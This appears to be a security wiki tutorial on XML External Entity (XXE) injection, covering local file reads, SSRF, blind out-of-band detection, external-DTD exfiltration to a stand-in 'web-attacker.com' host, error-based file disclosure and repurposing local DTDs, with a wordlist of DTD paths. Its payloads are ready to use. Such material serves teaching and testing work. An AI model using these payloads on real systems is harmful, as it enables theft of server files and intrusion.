---
description: Injecting Entities into XML data to read local files and exfiltrate data
---

# XML External Entities (XXE)

{% embed url="https://portswigger.net/web-security/xxe" %}
Source of most examples on this page
{% endembed %}

## XML

Extensible Markup Language (XML) is a common data format for defining structures of data that can be nested. The basics are very simple, HTML is basically XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

It also allows variables called "entities" to be defined and used throughout the document. These are defined in the Document Type Definition (DTD) using a `<!ENTITY` tag. After that, they can be used anywhere in the document using the `&[name];` syntax:

{% code title="Example of XML Entities" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE document [ <!ENTITY something "381"> ]>
<stockCheck><productId>&something;</productId></stockCheck>
```
{% endcode %}

## External Entities

This becomes more dangerous when we introduce **External Entities**. These can reference local files or remote URLs:

{% code title="Example of a local file" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
{% endcode %}

{% code title="Example of a remote URL" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1/endpoint?key=value"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
{% endcode %}

These become exploitable when an attacker can inject such entities into a document that will be parsed by the server, and then the result is returned in the response. You could easily read a local file like this, or make any GET request by the server (SSRF).&#x20;

## Blind XXE

In some cases, the document you send to the server is not directly returned back to you, only parsed by the server. All hope is not lost, as there are still various different techniques to make it exploitable.&#x20;

These can be easily detected with out-of-band detection. Tools like [`interactsh-client`](https://github.com/projectdiscovery/interactsh) can set up a domain that listens for DNS and HTTP requests, and you can send this domain as an external entity to see if a callback happens:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

### External DTDs

The goal of most XXE injections is to exfiltrate a local file. Using entities, we can load a file into a variable, and we can make a DNS/HTTP request to any fixed URL. But we can combine the two with External DTDs, which allow the **nesting** of entities using special "parameter entities". You can recognize these by the `%` percentage sign during definition and are used with the `%[name];` syntax.&#x20;

This allows us to define a `file` entity, and then put this entity into the URL of another entity. Once these are used anywhere in the document, the contents of the file are put in the URL and the request is made:

{% code title="malicious.dtd" %}
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
{% endcode %}

The catch is that External DTDs need to be, well, **external**. This means they cannot be inside of your initial payload and must be fetched from a local file or a remote URL. An attacker can host the file above, and then create the XXE injection attack with the following payload:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

### Error Based

A server might be hardened so that it cannot make random outgoing connections to your attacker's website, either to fetch the External DTD or to exfiltrate the file contents. In this case, two new techniques can be combined to still exfiltrate local files.&#x20;

An application might return details about an error when something goes wrong during the parsing of the XML document. One such error would be if it cannot find the local file specified in the entity. We can abuse this by defining a `%file;` entity again, and then using the file contents in the **path** of another entity, showing those contents in an error message:

{% code title="malicious.dtd" %}
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
{% endcode %}

{% code title="Example response" %}
```java
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```
{% endcode %}

Now you might be thinking, how do we load that external entity if outgoing connections are blocked? And this is where the second technique comes in.&#x20;

On many systems, there are **existing** XML **DTDs** that can be repurposed by us attackers to do something similar to what you see above. One simple example is the \
`/usr/share/xml/fontconfig/fonts.dtd`\
``file with the following content:

{% code title="fonts.dtd" %}
```xml
<!ENTITY % expr 'int|double|string|matrix|bool|charset|langset
      |name|const
      |or|and|eq|not_eq|less|less_eq|more|more_eq|contains|not_contains
      |plus|minus|times|divide|not|if|floor|ceil|round|trunc'>
[...]
<!ELEMENT test (%expr;)*>
```
{% endcode %}

The danger here is that an attacker can define this `%expr;` variable **before** it is defined here, and only the first definition will be used. From here, the attacker can escape the context using `)>` to add their own entities as if it were an external DTD that they control:

```xml
<!DOCTYPE message [
    <!-- Define the file path -->
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!-- Overwrite the %expr; entity to inject our error-based entities -->
    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///FILE_TO_READ">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    <!-- Load the local DTD now that it is set up -->
    %local_dtd;
]>
<message></message>
```

The payload needed will depend on what variables you can overwrite, and the context they are in. Template payloads on 5 different example contexts can be found here:

{% embed url="https://github.com/GoSecure/dtd-finder/blob/2c69ee0be7ab62dd470f0057799577d887782ead/src/main/kotlin/EntityTester.kt#L139-L223" %}
5 different context escapes using local DTDs
{% endembed %}

Here are a few more paths where you might find an existing exploitable DTD:

<details>

<summary>Wordlist (<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/">source</a>)</summary>

```
./properties/schemas/j2ee/XMLSchema.dtd
./../properties/schemas/j2ee/XMLSchema.dtd
./../../properties/schemas/j2ee/XMLSchema.dtd
/usr/share/java/jsp-api-2.2.jar!/javax/servlet/jsp/resources/jspxml.dtd
/usr/share/java/jsp-api-2.3.jar!/javax/servlet/jsp/resources/jspxml.dtd
/root/usr/share/doc/rh-python34-python-docutils-0.12/docs/ref/docutils.dtd
/root/usr/share/doc/rh-python35-python-docutils-0.12/docs/ref/docutils.dtd
/usr/share/doc/python2-docutils/docs/ref/docutils.dtd
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd
/usr/share/boostbook/dtd/1.1/boostbook.dtd
/usr/share/boostbook/dtd/boostbook.dtd
/usr/share/dblatex/schema/dblatex-config.dtd
/usr/share/struts/struts-config_1_0.dtd
/opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd
```

</details>

This technique will allow you to again get the file contents in the error message, without needing any outgoing connection to your server.&#x20;
